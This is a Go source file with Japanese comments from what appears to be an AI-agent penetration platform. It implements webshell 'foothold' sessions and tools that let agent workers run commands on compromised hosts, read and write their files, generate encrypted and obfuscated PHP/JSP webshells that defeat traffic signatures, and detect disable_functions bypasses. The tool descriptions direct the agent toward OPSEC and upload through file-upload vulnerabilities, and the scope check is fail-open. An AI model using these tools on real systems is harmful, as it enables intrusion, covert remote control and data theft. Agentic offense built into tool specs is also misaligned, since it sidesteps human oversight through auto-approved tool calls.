// session.go はフットホールドセッションサブシステム（イントラネット侵攻フェーズ 1a,INTRANET-PIVOT-DESIGN.md §4.2）を組み込む:
// プロセス内 Registry + DB 復元 + 4 つの host ツール（register_session/session_exec/
// session_read/session_write)。ツールはすべて通常のツール呼び出し——guard 承認を自動で通過し、
// activity に自動で記録される。これが外部チャネルに対する本質的な優位性。
//
// フットホールド戦略（foothold ladder):webshell を主チャネルとして優先。リバース/トンネルは後期に主チャネル経由で投入する。
package server

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"unicode/utf8"

	"github.com/Autumn-27/artex/agent"
	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/guard"
	"github.com/Autumn-27/artex/session"
	"github.com/Autumn-27/norma/permission"
	actool "github.com/Autumn-27/norma/tool"
)

// maxSessionToolOutput は session_exec/session_read がモデルに返す出力の上限（64KB)。
const maxSessionToolOutput = 64 * 1024

// 起動時ヘルスチェックのパラメータ（実態と異なる alive 表示を是正:演習場は停止済みで台帳は alive のまま）:
// last_beat が sessionStaleProbeAge を超えた alive セッションだけをチェックする（新しいものは再チェック不要）;
// 1 セッションあたり startupProbePerTimeout でタイムアウト、最大 startupProbeMaxConc 並列、全体予算
// startupProbeBudget。しきい値を変えるときは sessionStaleProbeAge だけを変更する。
const (
	sessionStaleProbeAge   = 24 * time.Hour
	startupProbePerTimeout = 8 * time.Second
	startupProbeBudget     = 60 * time.Second
	startupProbeMaxConc    = 8
)

// sessionNeedsStartupProbe は起動時ヘルスチェックのしきい値判定（純粋関数、テスト可能）:
// alive かつ last_beat から age を超えて経過している場合だけチェックが必要。境界ちょうどは古いとみなさない。
func sessionNeedsStartupProbe(rec *db.SessionRecord, now time.Time, age time.Duration) bool {
	return rec != nil && rec.Status == db.SessionAlive && now.Sub(rec.LastBeat) > age
}

// initSessions はセッションレジストリと永続化アクセス層を構築し、DB から存続セッションを復元する
// （restore_reverse_listeners 方式:起動時にドライバを再構築し、1 件ずつ馬型を再チェックしない）。復元後、
// 古い（last_beat が sessionStaleProbeAge 超）セッションに非同期の起動時ヘルスチェックを 1 回行う
// （startupProbeStale）:失敗時は正直に dead を記録して偽の alive を是正する。新しいセッションは次回使用時の
// 実リクエストで検証する。失敗はログのみで、起動を妨げない。
func (s *Server) initSessions() {
	if s.m.pg == nil {
		return
	}
	s.sessStore = db.NewSessionStore(s.m.pg, s.jwtKey)
	s.sessReg = session.NewRegistry()
	recs, err := s.sessStore.List(s.ctx, db.SessionAlive)
	if err != nil {
		log.Printf("[session] 起動時復元の読み込みに失敗: %v", err)
		return
	}
	restored := 0
	for _, rec := range recs {
		var sec session.Secret
		if err := json.Unmarshal(rec.Secret, &sec); err != nil {
			log.Printf("[session] セッション %d の secret 解析に失敗、スキップ: %v", rec.ID, err)
			continue
		}
		var sh *session.HTTPShell
		switch rec.Kind {
		case "http_php", "http_phpcmd", "http_jsp", "http_aspx", "http_phpenc", "http_jspenc":
			sh, err = session.RestoreHTTPShell(rec.ID, sec)
		case "reverse":
			// フェーズ 5:reverse セッションは penelope プロセスのメモリ上にあり、MCP 接続パラメータは
			// プラットフォームプロセスと共に失われるため復元不可——initReverse が一律に正直に dead を記録済みなので、ここでは黙ってスキップする。
			continue
		default:
			log.Printf("[session] セッション %d の種類 %s は今回のリリースでは復元非対応、スキップ", rec.ID, rec.Kind)
			continue
		}
		if err != nil {
			log.Printf("[session] セッション %d の復元に失敗、スキップ: %v", rec.ID, err)
			continue
		}
		s.sessReg.Add(sh)
		restored++
	}
	if len(recs) > 0 {
		log.Printf("[session] 起動時復元：%d/%d 件の存続セッションをレジストリに読み込みました", restored, len(recs))
	}
	// 起動時の衛生処理：古い（last_beat が 24h 超）alive セッションを非同期でヘルスチェックし、失敗時は正直に dead を記録する。
	// 非同期実行なので起動を妨げない。全体予算 60s 以内に完了する。
	go s.startupProbeStale(recs)
}

// startupProbeStale は古い alive セッションを並行してヘルスチェックする:成功時は last_beat を更新し（状態を
// alive に戻す）、失敗時は正直に dead を記録する。チェックするのはレジストリ内のセッションのみ（reverse/復元失敗の
// 行はドライバがなくチェックできないので現状維持）。終了後、ログで「起動時チェック：N 生存 M 死亡」を報告する。
func (s *Server) startupProbeStale(recs []*db.SessionRecord) {
	ctx, cancel := context.WithTimeout(s.ctx, startupProbeBudget)
	defer cancel()
	sem := make(chan struct{}, startupProbeMaxConc)
	var wg sync.WaitGroup
	var aliveN, deadN atomic.Int64
	probed := 0
	now := time.Now()
	for _, rec := range recs {
		if !sessionNeedsStartupProbe(rec, now, sessionStaleProbeAge) {
			continue
		}
		sess, ok := s.sessReg.Get(rec.ID)
		if !ok {
			continue
		}
		probed++
		wg.Add(1)
		go func(id int64, sess session.Session) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			pctx, pcancel := context.WithTimeout(ctx, startupProbePerTimeout)
			err := sess.Test(pctx)
			pcancel()
			// 状態の永続化には独立した短い ctx を使う:チェック用 ctx は予算/タイムアウトで既にキャンセル済みの可能性があり、dead の記録は必ず永続化する必要がある。
			dctx, dcancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer dcancel()
			if err != nil {
				if uerr := s.sessStore.UpdateStatus(dctx, id, db.SessionDead); uerr != nil {
					log.Printf("[session] 起動時チェック：セッション %d の dead 記録の永続化に失敗： %v", id, uerr)
				}
				deadN.Add(1)
				return
			}
			_ = s.sessStore.UpdateStatus(dctx, id, db.SessionAlive)
			s.sessStore.Touch(dctx, id)
			aliveN.Add(1)
		}(rec.ID, sess)
	}
	wg.Wait()
	if probed > 0 {
		log.Printf("[session] 起動時チェック：%d 生存 %d 死亡（古いセッション計 %d 件をチェック）",
			aliveN.Load(), deadN.Load(), probed)
	}
}

// sessionRoECheck はセッション登録前に、対象 URL の host が本タスクの RoE 範囲内かを検証する:
// strict はブロック、warn は警告して許可、範囲未登録/範囲内はそのまま許可。警告テキスト（空可）
// とブロックエラー（空可）を返す。タスク実行外（照会できる task scope がない）は未登録範囲として許可する。
func (s *Server) sessionRoECheck(ctx context.Context, rawURL string) (string, error) {
	ri := agent.RunInfoFrom(ctx)
	if ri.TaskID <= 0 || s.m.pg == nil {
		return "", nil
	}
	u, err := url.Parse(rawURL)
	if err != nil || u.Hostname() == "" {
		return "", nil // 対象を抽出できない = 対象なし、ブロックしない（guard の RoE と同じ保守的方針）
	}
	mode, _, _ := s.m.pg.GetSetting(settingRoEEnforcement)
	if strings.EqualFold(strings.TrimSpace(mode), "off") {
		return "", nil
	}
	rows, err := s.m.pg.Assets().ListTaskScope(ri.TaskID)
	if err != nil {
		return "", nil // 読み込み失敗は未登録範囲として扱う（fail-open、guard と同一）
	}
	verdict := guard.NewScopeMatcher(scopeRulesFromRows(rows)).Check(u.Hostname())
	if verdict != guard.ScopeOut {
		return "", nil
	}
	msg := fmt.Sprintf("RoE 認可範囲チェック：webshell の対象 %s は本タスク（task %d）の登録範囲外です。"+
		"許可する場合：対象をタスク範囲に追加する（add_task_scope）か、システム設定で roe_enforcement を warn/off に変更してください。",
		u.Hostname(), ri.TaskID)
	if strings.EqualFold(strings.TrimSpace(mode), "strict") {
		return "", fmt.Errorf("%s", msg)
	}
	return "⚠ " + msg, nil // warn：警告して許可
}

// --- host ツール（デフォルトで worker にバインド;tools テーブルに seed し、agent ごとに絞り込む） ---

func sessionPerm(context.Context, json.RawMessage, permission.Context) permission.Decision {
	return permission.Allowed()
}

// sessionTools はフットホールド用ツール（フェーズ 1a の 4 つ + 暗号化 webshell 生成 + フェーズ 2 の受動偵察）を返す。sessReg が
// nil（DB 未準備）の場合は提供しない。
func (s *Server) sessionTools() []actool.CoreTool {
	if s.sessReg == nil || s.sessStore == nil {
		return nil
	}
	return []actool.CoreTool{
		s.registerSessionTool(),
		s.sessionExecTool(),
		s.sessionReadTool(),
		s.sessionWriteTool(),
		s.generateWebshellTool(), // 自社開発の暗号化 webshell 生成（phpenc/jspenc）
		s.sessionReconTool(),     // フェーズ 2 の受動偵察（読み取り専用コマンド束 + recon 解析）
	}
}

// registerSessionTool は worker が取得した webshell をプラットフォーム管理のフットホールドセッションとして登録させる:
// まず無害なプローブで馬型を検出し、成功した場合のみ永続化して登録する。失敗時はプローブ応答の要約を返し、成功を偽装しない。
func (s *Server) registerSessionTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "register_session",
		Description: "【フットホールド主チャネル】取得済みの webshell をプラットフォーム管理のセッションとして登録する。" +
			"馬型：PHP eval ワンライナー(php)、PHP コマンド実行 webshell(phpcmd:POST パラメータが直接 shell コマンドで、本体が直接 exec して応答、eval なし)、jsp / aspx / auto(自動検出で eval プローブと cmd プローブを分けて型判定);自社開発の暗号化 webshell(phpenc/jspenc、generate_webshell で生成)," +
			"暗号化 webshell は全通信が暗号文で、セッションごとに独立した鍵を使う。登録時は secret=generate_webshell が返す key_b64 を必ず渡す。" +
			"まず URL に無害なプローブを送り（平文 webshell は echo のセンチネル、暗号化 webshell は op=probe の暗号化プローブ）馬型と利用可能な実行関数を検出し、検出に成功した場合のみ登録する。" +
			"session_id、馬型（eval/cmd/jsp/aspx/enc)、利用可能な実行関数、disable_functions のフィンガープリント、内蔵 LD_PRELOAD バイパスの可用性を返す。" +
			"失敗時は原因を明示する（webshell 到達不能/プローブプロトコル不一致/ブロックされた疑いを区別し、応答の要約を添え、偽装しない）。登録時は対象 host が RoE タスク範囲の検証を受ける。" +
			"フットホールド戦略：webshell を主チャネルとして優先する。以降の session_exec/session_read/session_write はすべてこれ経由で対象側で実行されるので、OPSEC に注意する。",
		Schema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"url":      strParam("webshell の完全な URL、プロトコルを含む（必須）"),
				"password": strParam("接続パスワード（POST フィールド名、デフォルトは cmd。暗号化 webshell では不要）"),
				"lang":     strParam("webshell の言語：php / phpcmd(PHP コマンド実行 webshell、POST パラメータが直接 shell コマンド) / jsp / aspx / auto（平文 webshell、デフォルトは auto）;phpenc / jspenc（自社開発の暗号化 webshell）"),
				"secret":   strParam("暗号化 webshell の鍵（phpenc/jspenc のみ必須：generate_webshell が返す key_b64)"),
			},
			"required": []any{"url"},
		},
		ReadOnly:    func(json.RawMessage) bool { return false },
		Permissions: sessionPerm,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a struct {
				URL      string `json:"url"`
				Password string `json:"password"`
				Lang     string `json:"lang"`
				Secret   string `json:"secret"`
			}
			_ = json.Unmarshal(in, &a)
			a.URL = strings.TrimSpace(a.URL)
			if a.URL == "" {
				return actool.Errorf("url は必須パラメータです"), nil
			}
			warn, roeErr := s.sessionRoECheck(ctx, a.URL)
			if roeErr != nil {
				return actool.Errorf(roeErr.Error()), nil
			}
			var sh *session.HTTPShell
			var info session.ProbeInfo
			var err error
			if a.Lang == "phpenc" || a.Lang == "jspenc" {
				// モデルは暗号化 webshell の鍵を反射的に password へ入れることが多い（ワンライナーの接続鍵の意味合い）。
				// secret が空の場合は password を別名として受け付け、予測可能な誤用のループを避ける。
				if strings.TrimSpace(a.Secret) == "" {
					a.Secret = strings.TrimSpace(a.Password)
				}
				if a.Secret == "" {
					return actool.Errorf("暗号化 webshell(" + a.Lang + "）の登録には鍵が必要です：generate_webshell が返す key_b64 を secret（または password）パラメータに入れてください"), nil
				}
				sh, info, err = session.ProbeEnc(ctx, a.URL, a.Lang, a.Secret)
			} else {
				sh, info, err = session.Probe(ctx, a.URL, a.Password, a.Lang)
			}
			if err != nil {
				return actool.Errorf("プローブに失敗しました：" + err.Error()), nil
			}
			secret, _ := json.Marshal(sh.Secret())
			ri := agent.RunInfoFrom(ctx)
			rec := &db.SessionRecord{
				Kind: info.Kind, URL: a.URL, Secret: secret, Lang: info.Lang,
				Status: db.SessionAlive, CreatedByTask: ri.TaskID, CreatedByIntent: ri.IntentID,
			}
			id, err := s.sessStore.Create(ctx, rec)
			if err != nil {
				return actool.Errorf("セッションの永続化に失敗しました：" + err.Error()), nil
			}
			sh.SetID(id)
			s.sessReg.Add(sh)
			// webshell 自体を endpoint アセットとして登録する（insert_assets の経路を再利用）;best-effort。
			var assetID int64
			if s.m.Assets() != nil {
				if aid, aerr := s.m.Assets().UpsertEndpoint(db.UpsertEndpointReq{
					URL: a.URL, Method: "POST", TaskID: ri.TaskID,
				}); aerr == nil {
					assetID = aid
					s.sessStore.SetHostAsset(ctx, id, aid)
				}
			}
			out := map[string]any{
				"session_id": id, "kind": info.Kind, "lang": info.Lang,
				"variant": info.Variant, "funcs": info.Funcs, "platform": info.Platform,
				"shell_type": shellTypeLabel(info), "message": registerMessage(info),
			}
			if assetID > 0 {
				out["host_asset_id"] = assetID
			}
			// disable_functions のフィンガープリントと内蔵バイパスの可用性（振り返り R1):ありのままに報告し、偽装しない。
			if strings.HasPrefix(info.Lang, "php") && info.Variant != "cmd" {
				out["disable_functions"] = info.DisableFunctions
				out["mail"], out["putenv"] = info.Mail, info.Putenv
				if info.Bypass != "" {
					out["bypass"], out["bypass_lib"] = info.Bypass, info.BypassLib
				}
				if info.BypassNote != "" {
					out["bypass_note"] = info.BypassNote
				}
			}
			if len(info.Funcs) == 0 && strings.HasPrefix(info.Lang, "php") && info.Variant != "cmd" {
				if info.Bypass != "" {
					out["warning"] = "対象の PHP はコマンド実行関数をすべて無効化しています（disable_functions);session_exec の直接実行は使えませんが、ファイル読み書きは可能です。" +
						"LD_PRELOAD バイパスを登録済み（.so は投入済み " + info.BypassLib + ")。session_exec をバイパス経由の実行につなぐのは今後の対応項目です"
				} else {
					out["warning"] = "対象の PHP はコマンド実行関数をすべて無効化しています（disable_functions);session_exec は使えませんが、ファイル読み書きは可能です"
				}
			}
			if warn != "" {
				out["roe_warning"] = warn
			}
			return jsonResult(out)
		},
	})
}

// shellTypeLabel はモデル向けの人間が読める馬型ラベルを返す。
func shellTypeLabel(info session.ProbeInfo) string {
	switch {
	case strings.HasSuffix(info.Lang, "enc"):
		return "enc"
	case info.Lang == "phpcmd" || info.Variant == "cmd":
		return "cmd"
	case info.Lang == "php":
		return "eval"
	default:
		return info.Lang
	}
}

// registerMessage は登録結果を明示する文案（振り返り R1:コマンド webshell の登録成功は必ず明示する）。
func registerMessage(info session.ProbeInfo) string {
	switch shellTypeLabel(info) {
	case "cmd":
		return "コマンド実行 webshell（cmdshell)として登録しました：session_exec は shell コマンドをそのまま渡し（センチネル同期）、ファイル読み書きは shell の base64 経路を使います"
	case "enc":
		return "暗号化セッション（" + info.Lang + "）として登録しました：全通信が暗号文です"
	case "eval":
		if info.DisableFunctions {
			if info.Bypass != "" {
				return "PHP eval webshell として登録しました;disable_functions は全禁止で session_exec の直接実行は使えませんが、LD_PRELOAD バイパスが利用可能なことを確認済みです"
			}
			return "PHP eval webshell として登録しました;disable_functions は全禁止で session_exec は使えず、ファイル読み書きのみ可能です"
		}
		return "PHP eval webshell（" + info.Variant + " 系）として登録しました"
	default:
		return "登録しました（" + info.Lang + " セッション）"
	}
}

// generateWebshellTool は自社開発の暗号化 webshell 本体（phpenc/jspenc）を生成する：AES-256-GCM
// による全暗号文通信 + ランダムパディング（PHP に GCM がない場合は本体が実行時に CBC+HMAC へ降格）、セッションごとに独立したランダム
// 鍵、変数/関数名は生成ごとにランダム化。ツールはプラットフォーム側でテンプレートを描画するだけで、対象には触れない。
func (s *Server) generateWebshellTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "generate_webshell",
		Description: "自社開発の暗号化 webshell 本体（phpenc/jspenc）を生成する:リクエスト/レスポンスはすべて暗号文（AES-256-GCM、PHP に GCM がない場合は本体が自動で CBC+HMAC へ降格）、ランダムパディングでトラフィックのシグネチャを無効化、" +
			"セッションごとに独立したランダム鍵、変数名をランダム化;任意で軽度の難読化（文字列の分割/連結、eval(base64) のような特徴の強い形は使わない）。" +
			"webshell 本体の内容 content、推奨ファイル名 filename、鍵 key_b64 と鍵の要約を返す。" +
			"使い方：content を上記のファイル名で対象へアップロードし（既存のフットホールドかファイルアップロード脆弱性を経由）、register_session(lang=phpenc|jspenc, secret=key_b64) で暗号化セッションとして登録する。",
		Schema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"lang":      strParam("本体の言語：php / jsp（必須）"),
				"obfuscate": map[string]any{"type": "boolean", "description": "PHP 本体の軽度な構文変形（文字列の分割/連結）、デフォルトは false"},
				"note":      strParam("備考（生成結果と共に返し、監査時の照合に使う。任意）"),
			},
			"required": []any{"lang"},
		},
		ReadOnly:    func(json.RawMessage) bool { return true }, // 読み取り専用:プラットフォーム側での描画のみで、外部副作用なし
		Permissions: sessionPerm,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a struct {
				Lang      string `json:"lang"`
				Obfuscate bool   `json:"obfuscate"`
				Note      string `json:"note"`
			}
			_ = json.Unmarshal(in, &a)
			gen, err := session.GenerateShell(a.Lang, a.Obfuscate, a.Note)
			if err != nil {
				return actool.Errorf("webshell 本体の生成に失敗しました：" + err.Error()), nil
			}
			return jsonResult(gen)
		},
	})
}

// sessionExecTool はセッション経由で対象側でコマンドを実行する（対象側実行 = ネットワーク上の位置がフットホールド）。
func (s *Server) sessionExecTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "session_exec",
		Description: "登録済みのフットホールドセッション経由で【対象側】で shell コマンドを 1 つ実行する（フットホールド主チャネル、webshell を優先）。" +
			"複雑なコマンド（引用符/改行を含む）は自動で base64 化して対象の一時ファイルに書き出してから実行し、使用後に削除する。一時ファイルは呼び出し元 worker の" +
			"task_intent プレフィックスで名前空間を分離し、同一セッション内の実行は直列化する（複数 worker の出力混線を防ぐ）。" +
			"stdout/stderr を返す;stderr は stdout に統合される（webshell 経由では分離できない）;出力が 64KB を超える場合は切り詰めた旨を付記する。" +
			"コマンドは対象マシン上で動くので、OPSEC（ログ/プロセス/ネットワークの痕跡）に注意する。",
		Schema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "integer", "description": "register_session が返すセッション id"},
				"command":    strParam("対象側で実行する shell コマンド"),
				"timeout":    map[string]any{"type": "integer", "description": "タイムアウト秒数（任意、デフォルト 15)"},
			},
			"required": []any{"session_id", "command"},
		},
		ReadOnly:    func(json.RawMessage) bool { return false },
		Permissions: sessionPerm,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a struct {
				SessionID int64  `json:"session_id"`
				Command   string `json:"command"`
				Timeout   int    `json:"timeout"`
			}
			_ = json.Unmarshal(in, &a)
			sess, err := s.lookupSession(a.SessionID)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			timeout := time.Duration(a.Timeout) * time.Second
			// per-worker の名前空間（振り返り R5):対象側の一時ファイルは task_intent プレフィックス付きで
			// 生成し、複数 worker が同じセッションを共用しても書き出しスクリプトが上書きし合わないようにする。ドライバ内の
			// per-session ロックが同一セッションの実行を直列化し、出力の混線を防ぐ。
			ri := agent.RunInfoFrom(ctx)
			execCtx := session.WithTmpPrefix(ctx, session.WorkerTmpPrefix(ri.TaskID, ri.IntentID))
			stdout, stderr, err := sess.Exec(execCtx, a.Command, timeout)
			s.sessStore.Touch(ctx, a.SessionID)
			if err != nil {
				return actool.Errorf("実行に失敗しました：" + err.Error()), nil
			}
			out := map[string]any{"stdout": truncateOutput(stdout), "stderr": truncateOutput(stderr)}
			if len(stdout) > maxSessionToolOutput || len(stderr) > maxSessionToolOutput {
				out["truncated"] = true
			}
			return jsonResult(out)
		},
	})
}

// sessionReadTool はセッション経由で対象側のファイルを読む（大きいファイルは分割する）。
func (s *Server) sessionReadTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "session_read",
		Description: "フットホールドセッション経由で対象側のファイルを読む（大きいファイルは自動で 512KB ずつ分割）。" +
			"テキストは content で返し（64KB 超は切り詰めた旨を付記）;バイナリは content_base64 で返す。",
		Schema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "integer", "description": "セッション id"},
				"path":       strParam("対象側ファイルの絶対パス"),
			},
			"required": []any{"session_id", "path"},
		},
		ReadOnly:    func(json.RawMessage) bool { return false },
		Permissions: sessionPerm,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a struct {
				SessionID int64  `json:"session_id"`
				Path      string `json:"path"`
			}
			_ = json.Unmarshal(in, &a)
			sess, err := s.lookupSession(a.SessionID)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			data, err := sess.ReadFile(ctx, strings.TrimSpace(a.Path))
			s.sessStore.Touch(ctx, a.SessionID)
			if err != nil {
				return actool.Errorf("読み込みに失敗しました：" + err.Error()), nil
			}
			out := map[string]any{"size": len(data)}
			truncated := false
			if len(data) > maxSessionToolOutput {
				data = data[:maxSessionToolOutput]
				truncated = true
			}
			if utf8.Valid(data) {
				out["content"] = string(data)
			} else {
				out["content_base64"] = base64.StdEncoding.EncodeToString(data)
			}
			if truncated {
				out["truncated"] = true
			}
			return jsonResult(out)
		},
	})
}

// sessionWriteTool はセッション経由で対象側にファイルを書く（大きいファイルは分割して append する）。
func (s *Server) sessionWriteTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "session_write",
		Description: "フットホールドセッション経由で対象側にファイルを書く（バイナリ安全、大きいファイルは自動で 512KB ずつ append）。" +
			"ファイル書き込みは高リスクの書き込み操作なので、OPSEC に注意する（書き込みは検知エンジンに見つかる検出面がある）。",
		Schema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id":     map[string]any{"type": "integer", "description": "セッション id"},
				"path":           strParam("対象側ファイルの絶対パス"),
				"content":        strParam("テキスト内容（content_base64 と二択）"),
				"content_base64": strParam("バイナリ内容の base64（content と二択、こちらを優先）"),
			},
			"required": []any{"session_id", "path"},
		},
		ReadOnly:    func(json.RawMessage) bool { return false },
		Permissions: sessionPerm,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a struct {
				SessionID     int64  `json:"session_id"`
				Path          string `json:"path"`
				Content       string `json:"content"`
				ContentBase64 string `json:"content_base64"`
			}
			_ = json.Unmarshal(in, &a)
			sess, err := s.lookupSession(a.SessionID)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			data := []byte(a.Content)
			if a.ContentBase64 != "" {
				data, err = base64.StdEncoding.DecodeString(a.ContentBase64)
				if err != nil {
					return actool.Errorf("content_base64 のデコードに失敗しました：" + err.Error()), nil
				}
			}
			if err := sess.WriteFile(ctx, strings.TrimSpace(a.Path), data); err != nil {
				return actool.Errorf("書き込みに失敗しました：" + err.Error()), nil
			}
			s.sessStore.Touch(ctx, a.SessionID)
			return jsonResult(map[string]any{"bytes": len(data), "path": a.Path})
		},
	})
}

// lookupSession はレジストリからセッションを取得する。見つからない場合は意味の明確なエラーを返す。
func (s *Server) lookupSession(id int64) (session.Session, error) {
	if id <= 0 {
		return nil, fmt.Errorf("session_id は必須で、0 より大きい必要があります")
	}
	sess, ok := s.sessReg.Get(id)
	if !ok {
		return nil, fmt.Errorf("session %d は存在しません（未登録/削除済み/プロセス再起動後の復元失敗）ので、register_session で再登録してください", id)
	}
	return sess, nil
}

// truncateOutput は長すぎる出力を切り詰めて注記する。
func truncateOutput(s string) string {
	if len(s) <= maxSessionToolOutput {
		return s
	}
	return s[:maxSessionToolOutput] + fmt.Sprintf("\n…[出力切り詰め：全 %d バイト、先頭 %d のみ返却]", len(s), maxSessionToolOutput)
}

// seedSessionTools は 4 つのセッションツールを tools テーブルに seed し、デフォルトで worker にバインドする
// （stage_share と同じ SeedTool の初回挿入セマンティクス:既存 DB のユーザー編集は上書きしない）。
func (s *Server) seedSessionTools() {
	workerAgents, _ := json.Marshal([]string{"worker"})
	for _, t := range s.sessionTools() {
		schema, _ := json.Marshal(t.InputSchema())
		if err := s.m.PG().SeedTool(t.Name(), t.Description(), schema, workerAgents); err != nil {
			log.Printf("[tools] %s の seed に失敗： %v", t.Name(), err)
		}
	}
}
